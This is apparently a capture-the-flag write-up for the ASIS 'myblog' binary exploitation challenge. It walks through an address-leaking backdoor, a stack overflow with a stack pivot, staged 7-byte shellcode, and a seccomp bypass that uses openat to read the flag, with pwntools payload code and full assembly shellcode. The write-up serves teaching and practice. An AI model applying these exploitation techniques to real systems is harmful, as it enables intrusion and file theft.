# myblog

The program offers a basic interface for managing post.
E.g. option 3 can be used to set the blog owner.
Any operation will result in an exit after completion.
```
1. Write a blog post
2. Delete a blog post
3. Show the blog owner
4. Exit
```

A first quick analysis reveals some intresting facts.
First of all, a memory section with rwx privileges is allocated, this could be interesting for storing shellcode.
Second, thr program uses seccomp, therefore some system calls might be disallowed.
```
[...]
mmap(0x656ca000, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
[...]
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)  = 0
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=11, filter=0x7ffefe130eb0}) = 0
[...]
```

# Backdoor
By reverse engineering we found a hidden option with the id 31337.
This method will give us its own address and therefore can be used to compute the binary base.

```C
int backdoor() {
    puts(0x15d8);
    printf("I will give you a gift %p\n", backdoor);
```

In addition a 16 byte stack based buffer overflow is given, what allow us to control rip and rbp.
Sadly this is not enough to store a complete rop chain.

```assembly
sub        rsp, 0x10
[...]
lea        rax, qword [rbp+8]
mov        edx, 0x18                                   ; argument "nbyte" for method j_read
mov        rsi, rax                                    ; argument "buf" for method j_read
mov        edi, 0x0                                    ; argument "fildes" for method j_read
mov        eax, 0x0
call       j_read
```

Additionally, a check is performed, if rip and rbp are pointing to the first 0xfff bytes of the binary.
This limit our usable targets, as we can not jump to any function using syscalls.
Even though, we can jump into the menu handler and call `delete_post`, `write_post` methods, so we can reuse them.


# Executing 7 bytes
An interesting function to use is the `show_owner` as it can be used to change the blog owner (7 Bytes), which is stored in the rwx section.
A pointer to this section is located in the .bss segment.
Therefore we approach the following stack layout for our buffer overflow and stack pivot:


```
.stack
+-----------------+
| new rbp         |
+-----------------+
| call_show_owner |
+-----------------+ <- rbp
| ...             |

.bss
+-----------------+
| rwx_ptr         |
+-----------------+
|                 |
+-----------------+ <- new rbp
```

The strategy would be:
1. call show owner
2. write 7 bytes of shellcode
3. return to menu handler
4. exit, jmp to rwx section



```python
call_show_owner =  blog_base_ptr + 0x10c2
rwx_ptr =  blog_base_ptr + 0x202048
payload = "AAAAAAAA"
payload += pwn.p64(rwx_ptr-8) #rbp
payload += pwn.p64(call_show_owner) #rip
r.send(payload)
```

# Executing arbitrary shell

As the maximum shellcode length is limited to 7 bytes, we need a way to read more shellcode.
As rax is already set to 0 (`sys_read`) we can try to directly write to the rwx memory section
The rdi register defines the maximum number of bytes to be read and is a random pointer, therfore this register needs no changes.
We only need to point rsi to the rwx section.
As rsp is already pointing below the rwx pointer in the .bss section we can use the following shellcode, what compiles to exactly 7 bytes.

```
shellcode = "sub rsp,8; pop rsi; syscall"
shellcode = pwn.asm(shellcode)
r.send(shellcode)
```

We send our shellcode shellcode with 7 bytes of padding, so it will be executed directly after the `read` system call returns.

# Seccomp

Even though we can execute arbitrary code, we are not finished yet as seccomp is used to blacklist some systemcalls.
`seccomp-tools` (https://github.com/david942j/seccomp-tools) can be used to disassemble these rules and show them in a human readable format.

```
seccomp-tools dump ./myblog

 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x06 0x00 0x40000000  if (A >= 0x40000000) goto 0010
 0004: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0010
 0005: 0x15 0x04 0x00 0x0000003b  if (A == execve) goto 0010
 0006: 0x15 0x03 0x00 0x00000039  if (A == fork) goto 0010
 0007: 0x15 0x02 0x00 0x0000003a  if (A == vfork) goto 0010
 0008: 0x15 0x01 0x00 0x00000038  if (A == clone) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

Execve is blocked, therefore, we cannot execute `execve("/bin/sh", NULL, NULL)` directly.
Open is blocked, therefore we should not be able to open files and read the Flag.
Even though `open_at syscall()` is not blocked, what allows us to open a file in a directory.
This syscall requires the following arguments:

| Register | Description |
|----------|-------------|
| rdi | Directory file Descriptor (will be ignored for an absolute path) |
| rsi | Filename |
| rdx | Flags |
| r10 | Mode |

Therefore we can use the following shellcode to opena file, read 1024 bytes and write it to stdout.

```assembly
    jmp str;
ret:
    pop rsi;
    xor rdi, rdi;
    xor rdx, rdx;
    xor r10, r10;
    mov eax, 257;
    syscall

    mov rdi, rax;
    mov rsi, rsp;
    mov rdx, 1024;
    mov eax, 0;
    syscall;

    mov rdi, 1;
    mov eax, 1;
    syscall;

    mov eax, 60;
    syscall

str:
    call    ret
    .string "the filename goes here"
```

And finally recover the flag: ASIS{526eb5559eea12d1e965fe497b4abb0a308f2086}

# Files
- [Exploit](exploit.py)
- [Binary](myblog)
- [Hopper file](myblog.hop)
